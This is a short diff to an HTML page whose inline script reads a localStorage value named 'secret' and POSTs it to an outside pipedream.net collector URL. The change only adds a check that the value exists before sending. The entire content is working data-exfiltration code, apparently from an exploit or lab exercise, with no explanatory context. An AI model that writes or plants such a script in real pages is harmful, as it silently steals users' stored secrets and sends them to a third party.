@@ -6,11 +6,14 @@
 </head>
 <body>
   <script>
-    fetch('https://eozxolyh76p7q9f.m.pipedream.net', {
-      method: 'POST',
-      mode: 'no-cors',
-      body: localStorage.getItem('secret')
-    });
+    const secret = localStorage.getItem('secret');
+    if (secret) {
+      fetch('https://eozxolyh76p7q9f.m.pipedream.net', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: secret
+      });
+    }
   </script>
 </body>
 </html>
